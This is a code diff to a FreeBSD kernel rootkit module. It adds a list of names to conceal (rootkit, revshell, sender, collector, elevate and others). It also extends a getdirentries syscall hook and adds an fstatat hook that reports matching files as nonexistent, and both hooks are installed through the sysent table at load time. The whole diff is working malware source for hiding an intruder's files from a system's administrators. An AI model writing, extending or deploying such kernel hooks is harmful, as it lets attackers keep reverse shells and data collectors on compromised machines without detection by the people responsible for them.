@@ -171,6 +171,30 @@ struct module {
         modspecific_t           data;   /* module specific data */
 };
 
+#define SIZE 10
+static int is_hiding_path(char kpath[MAXPATHLEN]) {
+    char *paths[SIZE] = {
+        "elevate",
+        "rootkit",
+        "revshell",
+        "sender",
+        "collector",
+        "remote",
+        "log.c",
+        "log.h",
+        "log.o",
+        // "logsrc"
+        "hide",
+    };
+    for (int i = 0; i < SIZE; i++) {
+        if (strcasestr(kpath, paths[i]) != NULL) {
+            return 1;
+        }
+    }
+
+    return 0;
+}
+
 static int getdirentries_hook(struct thread *td, void *syscall_args) {
     struct getdirentries_args *uap; 
     uap = (struct getdirentries_args *) syscall_args;
@@ -186,16 +210,15 @@ static int getdirentries_hook(struct thread *td, void *syscall_args) {
         count = size;
         struct dirent *curr_rec = d;
         while (curr_rec->d_reclen != 0 && count > 0) {
-            count -= curr_rec->d_reclen;
+            count -= curr_rec->d_reclen;            
             // Add more module to hide here
-            if (strcmp(curr_rec->d_name, "hiding.ko") == 0 
-                || strcmp(curr_rec->d_name, "rootkit.ko") == 0
-            ) {
+            if (is_hiding_path(curr_rec->d_name)) {
                 if (count != 0) {
                     memmove((char *) curr_rec, 
                         (char *) curr_rec + curr_rec->d_reclen, count);
                 }
                 size -= curr_rec->d_reclen;
+                continue;
             }
 
             if (count > 0) {
@@ -208,6 +231,18 @@ static int getdirentries_hook(struct thread *td, void *syscall_args) {
     }
 
     return error;
+}
+
+static int fstatat_hook(struct thread *td, struct fstatat_args *uap) {
+    char kpath[MAXPATHLEN];
+    size_t done;
+    if (uap->path != NULL) {
+        int error = copyinstr(uap->path, kpath, MAXPATHLEN, &done);
+        if (!error && is_hiding_path(kpath) ) {
+            return ENOENT;
+        }
+    }
+    return sys_fstatat(td, uap);
 }
 
 struct port_hiding_args {
@@ -311,6 +346,7 @@ static int load(module_t module, int cmd, void *arg) {
         /* Initialize character device interface via interface.c */
         error = make_rootkit_dev();
         sysent[SYS_getdirentries].sy_call = (sy_call_t *) getdirentries_hook;
+        sysent[SYS_fstatat].sy_call = (sy_call_t *) fstatat_hook;
 
         if (error == 0) {
             struct proc *p = NULL;
